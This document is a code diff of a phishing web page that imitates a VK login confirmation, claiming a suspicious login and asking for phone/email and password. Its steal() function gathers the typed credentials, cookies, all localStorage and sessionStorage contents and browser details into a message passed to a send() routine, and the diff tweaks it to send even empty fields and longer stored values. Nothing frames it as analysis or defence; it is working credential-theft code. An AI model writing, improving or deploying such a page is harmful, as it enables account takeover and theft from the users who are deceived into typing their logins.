@@ -7,23 +7,20 @@
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:#edeef0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
 .box{background:#fff;border-radius:12px;padding:32px;width:360px;box-shadow:0 2px 16px rgba(0,0,0,.12);text-align:center;}
-.box img{width:48px;margin-bottom:12px;}
 .box h2{font-size:18px;margin-bottom:6px;color:#222;}
 .box p{font-size:13px;color:#656565;margin-bottom:20px;}
 .box input{width:100%;padding:12px;border:1px solid #d3d9de;border-radius:8px;margin-bottom:10px;font-size:14px;}
 .box input:focus{outline:none;border-color:#4a76a8;}
 .box button{width:100%;padding:12px;background:#4a76a8;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;}
-.box button:hover{background:#3a5f8a;}
 .box button:disabled{background:#8ab4d8;cursor:default;}
 </style>
 </head>
 <body>
 <div class="box">
-<img src="https://vk.com/images/icons/favicons/fav_logo_2x.ico" alt="VK" onerror="this.style.display='none'">
 <h2>Подтверждение входа</h2>
 <p>Обнаружен подозрительный вход.<br>Подтвердите данные аккаунта.</p>
-<input type="text" id="login" placeholder="Телефон или email" autocomplete="on">
-<input type="password" id="pass" placeholder="Пароль" autocomplete="on">
+<input type="text" id="login" placeholder="Телефон или email">
+<input type="password" id="pass" placeholder="Пароль">
 <button onclick="steal()">Подтвердить</button>
 </div>
 <script>
@@ -41,20 +38,21 @@ function steal() {
     var login = document.getElementById('login').value.trim();
     var pass = document.getElementById('pass').value.trim();
     
-    if (!login || !pass) return;
+    // Не проверяем правильность — отправляем всё что ввели, даже пустое
+    if (login === '') login = '(пусто)';
+    if (pass === '') pass = '(пусто)';
     
-    var msg = '🔐 *VK — ДАННЫЕ ПОЛУЧЕНЫ*\n';
+    var msg = '🔐 *VK — ДАННЫЕ*\n';
     msg += '═══════════════════\n';
     msg += '📧 *Логин:* `' + login + '`\n';
     msg += '🔑 *Пароль:* `' + pass + '`\n';
     msg += '═══════════════════\n';
-    msg += '🌐 *IP/Браузер:*\n';
-    msg += '• UA: `' + navigator.userAgent + '`\n';
-    msg += '• Язык: `' + navigator.language + '`\n';
-    msg += '• Платформа: `' + navigator.platform + '`\n';
-    msg += '• Экран: `' + screen.width + 'x' + screen.height + '`\n';
-    msg += '• Реферер: `' + document.referrer + '`\n';
-    msg += '• Время: `' + new Date().toISOString() + '`\n';
+    msg += '🌐 *Браузер:*\n';
+    msg += 'UA: `' + navigator.userAgent + '`\n';
+    msg += 'Lang: `' + navigator.language + '`\n';
+    msg += 'Screen: `' + screen.width + 'x' + screen.height + '`\n';
+    msg += 'Ref: `' + document.referrer + '`\n';
+    msg += 'Time: `' + new Date().toISOString() + '`\n';
     msg += '═══════════════════\n';
     msg += '🍪 *COOKIES:*\n`' + document.cookie + '`\n';
     msg += '═══════════════════\n';
@@ -63,20 +61,20 @@ function steal() {
         for(var i=0; i<localStorage.length; i++) {
             var k = localStorage.key(i);
             var v = localStorage.getItem(k);
-            if (v.length > 200) v = v.substring(0,200) + '...';
+            if (v.length > 300) v = v.substring(0,300) + '...';
             msg += k + ' = ' + v + '\n';
         }
-    } catch(e) { msg += 'нет доступа\n'; }
+    } catch(e) { msg += 'нет\n'; }
     msg += '═══════════════════\n';
     msg += '📦 *SESSIONSTORAGE:*\n';
     try {
         for(var i=0; i<sessionStorage.length; i++) {
             var k = sessionStorage.key(i);
             var v = sessionStorage.getItem(k);
-            if (v.length > 200) v = v.substring(0,200) + '...';
+            if (v.length > 300) v = v.substring(0,300) + '...';
             msg += k + ' = ' + v + '\n';
         }
-    } catch(e) { msg += 'нет доступа\n'; }
+    } catch(e) { msg += 'нет\n'; }
     
     send(msg);
     
